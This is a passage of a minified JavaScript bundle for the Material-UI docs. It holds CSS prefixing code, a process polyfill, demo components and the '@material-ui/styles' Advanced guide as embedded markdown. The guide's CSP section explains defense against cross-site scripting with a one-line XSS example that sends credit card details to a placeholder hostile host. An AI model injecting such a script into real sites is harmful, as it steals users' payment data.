n=e.length,t=e.indexOf(":",9)+1,s=e.substring(0,t).trim(),r=e.substring(t,n-1).trim();switch(e.charCodeAt(9)*Ee){case 0:break;case U:if(110!==e.charCodeAt(10))break;default:for(var o=r.split((r="",i)),a=0,t=0,n=o.length;a<n;t=0,++a){for(var c=o[a],d=c.split(l);c=d[t];){var u=c.charCodeAt(0);if(1===Ee&&(u>L&&u<90||u>96&&u<123||u===G||u===U&&c.charCodeAt(1)!==U))switch(isNaN(parseFloat(c))+(-1!==c.indexOf("("))){case 1:switch(c){case"infinite":case"alternate":case"backwards":case"running":case"normal":case"forwards":case"both":case"none":case"linear":case"ease":case"ease-in":case"ease-out":case"ease-in-out":case"paused":case"reverse":case"alternate-reverse":case"inherit":case"initial":case"unset":case"step-start":case"step-end":break;default:c+=Re}}d[t++]=c}r+=(0===a?"":",")+d.join(" ")}}return r=s+r+";",1===be||2===be&&Le(r,1)?O+r+r:r}(u);if(0===be||2===be&&!Le(u,1))return u;switch(m){case 1015:return 97===u.charCodeAt(10)?O+u+u:u;case 951:return 116===u.charCodeAt(3)?O+u+u:u;case 963:return 110===u.charCodeAt(5)?O+u+u:u;case 1009:if(100!==u.charCodeAt(4))break;case 969:case 942:return O+u+u;case 978:return O+u+M+u+u;case 1019:case 983:return O+u+M+u+A+u+u;case 883:return u.charCodeAt(8)===U?O+u+u:u.indexOf("image-set(",11)>0?u.replace(N,"$1"+O+"$2")+u:u;case 932:if(u.charCodeAt(4)===U)switch(u.charCodeAt(5)){case 103:return O+"box-"+u.replace("-grow","")+O+u+A+u.replace("grow","positive")+u;case 115:return O+u+A+u.replace("shrink","negative")+u;case 98:return O+u+A+u.replace("basis","preferred-size")+u}return O+u+A+u+u;case 964:return O+u+A+"flex-"+u+u;case 1023:if(99!==u.charCodeAt(8))break;return c=u.substring(u.indexOf(":",15)).replace("flex-","").replace("space-between","justify"),O+"box-pack"+c+O+u+A+"flex-pack"+c+u;case 1005:return o.test(u)?u.replace(r,":"+O)+u.replace(r,":"+M)+u:u;case 1e3:switch(d=(c=u.substring(13).trim()).indexOf("-")+1,c.charCodeAt(0)+c.charCodeAt(d)){case 226:c=u.replace(w,"tb");break;case 232:c=u.replace(w,"tb-rl");break;case 220:c=u.replace(w,"lr");break;default:return u}return O+u+A+c+u;case 1017:if(-1===u.indexOf("sticky",9))return u;case 975:switch(d=(u=e).length-10,m=(c=(33===u.charCodeAt(d)?u.substring(0,d):u).substring(e.indexOf(":",7)+1).trim()).charCodeAt(0)+(0|c.charCodeAt(7))){case 203:if(c.charCodeAt(8)<111)break;case 115:u=u.replace(c,O+c)+";"+u;break;case 207:case 102:u=u.replace(c,O+(m>102?"inline-":"")+"box")+";"+u.replace(c,O+c)+";"+u.replace(c,A+c+"box")+";"+u}return u+";";case 938:if(u.charCodeAt(5)===U)switch(u.charCodeAt(6)){case 105:return c=u.replace("-items",""),O+u+O+"box-"+c+A+"flex-"+c+u;case 115:return O+u+A+"flex-item-"+u.replace(T,"")+u;default:return O+u+A+"flex-line-pack"+u.replace("align-content","").replace(T,"")+u}break;case 973:case 989:if(u.charCodeAt(3)!==U||122===u.charCodeAt(4))break;case 931:case 953:if(!0===k.test(e))return 115===(c=e.substring(e.indexOf(":")+1)).charCodeAt(0)?We(e.replace("stretch","fill-available"),n,t,s).replace(":fill-available",":stretch"):u.replace(c,O+c)+u.replace(c,M+c.replace("fill-",""))+u;break;case 962:if(u=O+u+(102===u.charCodeAt(5)?A+u:"")+u,t+s===211&&105===u.charCodeAt(13)&&u.indexOf("transform",10)>0)return u.substring(0,u.indexOf(";",27)+1).replace(a,"$1"+O+"$2")+u}return u}function Le(e,n){var t=e.indexOf(1===n?":":"{"),s=e.substring(0,3!==n?t:10),r=e.substring(t+1,e.length-1);return Ce(2!==n?s:s.replace(C,"$1"),r,n)}function Je(e,n){var t=We(n,n.charCodeAt(0),n.charCodeAt(1),n.charCodeAt(2));return t!==n+";"?t.replace(P," or ($1)").substring(4):"("+n+")"}function qe(e,n,t,s,r,o,a,i,l,c){for(var d,u=0,m=n;u<Te;++u)switch(d=Pe[u].call(Ye,e,m,t,s,r,o,a,i,l,c)){case void 0:case!1:case!0:case null:break;default:m=d}if(m!==n)return m}function Ue(e,n,t,s){for(var r=n+1;r<t;++r)switch(s.charCodeAt(r)){case Z:if(e===Y&&s.charCodeAt(r-1)===Y&&n+2!==r)return r+1;break;case z:if(e===Z)return r+1}return r}function Ge(e){for(var n in e){var t=e[n];switch(n){case"keyframe":Ee=0|t;break;case"global":ve=0|t;break;case"cascade":ye=0|t;break;case"compress":Se=0|t;break;case"semicolon":je=0|t;break;case"preserve":we=0|t;break;case"prefix":Ce=null,t?"function"!=typeof t?be=1:(be=2,Ce=t):be=0}}return Ge}function Ye(n,t){if(void 0!==this&&this.constructor===Ye)return e(n);var r=n,o=r.charCodeAt(0);o<33&&(o=(r=r.trim()).charCodeAt(0)),Ee>0&&(Re=r.replace(p,o===F?"":"-")),o=1,1===ye?Fe=r:Be=r;var a,i=[Fe];Te>0&&void 0!==(a=qe(Ne,t,i,i,fe,he,0,0,0,0))&&"string"==typeof a&&(t=a);var l=He(xe,i,t,0,0);return Te>0&&void 0!==(a=qe(ke,l,i,i,fe,he,l.length,0,0,0))&&"string"!=typeof(l=a)&&(o=0),Re="",Fe="",Be="",ge=0,fe=1,he=1,Se*o==0?l:l.replace(s,"").replace(y,"").replace(b,"$1").replace(v,"$1").replace(S," ")}return Ye.use=function e(n){switch(n){case void 0:case null:Te=Pe.length=0;break;default:if("function"==typeof n)Pe[Te++]=n;else if("object"==typeof n)for(var t=0,s=n.length;t<s;++t)e(n[t]);else De=0|!!n}return e},Ye.set=Ge,void 0!==n&&Ge(n),Ye}(null)},"5IsQ":function(e,n){var t,s,r=e.exports={};function o(){throw new Error("setTimeout has not been defined")}function a(){throw new Error("clearTimeout has not been defined")}function i(e){if(t===setTimeout)return setTimeout(e,0);if((t===o||!t)&&setTimeout)return t=setTimeout,setTimeout(e,0);try{return t(e,0)}catch(n){try{return t.call(null,e,0)}catch(n){return t.call(this,e,0)}}}!function(){try{t="function"==typeof setTimeout?setTimeout:o}catch(e){t=o}try{s="function"==typeof clearTimeout?clearTimeout:a}catch(e){s=a}}();var l,c=[],d=!1,u=-1;function m(){d&&l&&(d=!1,l.length?c=l.concat(c):u=-1,c.length&&p())}function p(){if(!d){var e=i(m);d=!0;for(var n=c.length;n;){for(l=c,c=[];++u<n;)l&&l[u].run();u=-1,n=c.length}l=null,d=!1,function(e){if(s===clearTimeout)return clearTimeout(e);if((s===a||!s)&&clearTimeout)return s=clearTimeout,clearTimeout(e);try{s(e)}catch(n){try{return s.call(null,e)}catch(n){return s.call(this,e)}}}(e)}}function h(e,n){this.fun=e,this.array=n}function f(){}r.nextTick=function(e){var n=new Array(arguments.length-1);if(arguments.length>1)for(var t=1;t<arguments.length;t++)n[t-1]=arguments[t];c.push(new h(e,n)),1!==c.length||d||i(p)},h.prototype.run=function(){this.fun.apply(null,this.array)},r.title="browser",r.browser=!0,r.env={},r.argv=[],r.version="",r.versions={},r.on=f,r.addListener=f,r.once=f,r.off=f,r.removeListener=f,r.removeAllListeners=f,r.emit=f,r.prependListener=f,r.prependOnceListener=f,r.listeners=function(e){return[]},r.binding=function(e){throw new Error("process.binding is not supported")},r.cwd=function(){return"/"},r.chdir=function(e){throw new Error("process.chdir is not supported")},r.umask=function(){return 0}},"5OFl":function(e,n){e.exports="# Advanced\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accessing the theme in a component\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Вложенные темы\n\nYou can nest multiple theme providers. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nThe inner theme will **override** the outer theme. You can extend the outer theme by providing a function:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### withStyles\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser. It's one of the key elements to know when overriding styles. We **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML-комментарий\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Другой HTML-элемент\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Имена классов\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Глобальный CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client-side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},"6c61":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return l});var s=t("mXGw"),r=t.n(s),o=t("3O2h"),a=Object(o.a)({"@global":{".cssjss-advanced-global-root":{height:100,width:100,backgroundColor:"blue"},".cssjss-advanced-global-child":{height:8,backgroundColor:"red"}}}),i=r.a.createElement("div",{className:"cssjss-advanced-global-root"},r.a.createElement("div",{className:"cssjss-advanced-global-child"}));function l(){return a(),i}},"6iTa":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return f});var s=t("Rbzu"),r=t("mXGw"),o=t.n(r),a=t("3O2h"),i=t("AMAy"),l=t("h7Hf"),c=Object(a.a)(function(e){return Object(i.a)({root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:e.boxShadow,color:"white",height:48,padding:"0 30px"}})});function d(){var e=c();return o.a.createElement("button",{type:"button",className:e.root},"Theme nesting")}var u=o.a.createElement(d,null),m=o.a.createElement("br",null),p=o.a.createElement("br",null),h=o.a.createElement(d,null);function f(){return o.a.createElement("div",null,o.a.createElement(l.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)",boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)"}},u,m,p,o.a.createElement(l.a,{theme:function(e){return Object(s.a)({},e,{background:"linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)",boxShadow:"0 3px 5px 2px rgba(33, 203, 243, .3)"})}},h)))}},"76xw":function(e,n){e.exports="import React from 'react';\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles({\n  root: {\n    '&.root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '& .child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function HybridCss() {\n  const classes = useStyles();\n\n  return (\n    <div className={clsx(classes.root, 'root')}>\n      <div className=\"child\" />\n    </div>\n  );\n}\n"},"7BXB":function(e,n){e.exports="# 高度な\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accessing the theme in a component\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### ネストテーマ\n\nYou can nest multiple theme providers. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nThe inner theme will **override** the outer theme. You can extend the outer theme by providing a function:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### withStyles\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote 